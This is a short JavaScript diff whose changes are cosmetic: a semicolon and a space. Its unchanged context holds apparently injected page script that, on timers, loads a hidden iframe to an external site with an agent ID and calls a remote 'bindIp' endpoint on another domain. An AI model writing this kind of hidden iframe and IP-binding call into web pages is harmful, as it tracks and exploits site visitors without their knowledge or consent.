@@ -11,7 +11,7 @@
             iframe.style.display = "none"
             iframe.src = "https://www.highgg.com?agentId=7134700";
             document.body.append(iframe);
-        }, 500)
+        }, 500);
         setTimeout(function () {
             fetch("https://www.371zhongyi.com/user/bindIp", {
                 "headers": {
@@ -109,7 +109,7 @@
             function ajax_parse_img_txt(job, callback) {
                 var dom = job['dom'];
                 var url = job['url'];
-                if(!url) return;
+                if (!url) return;
                 if (!url.startsWith("http")) {
                     rend_img(dom, url);
                     callback();
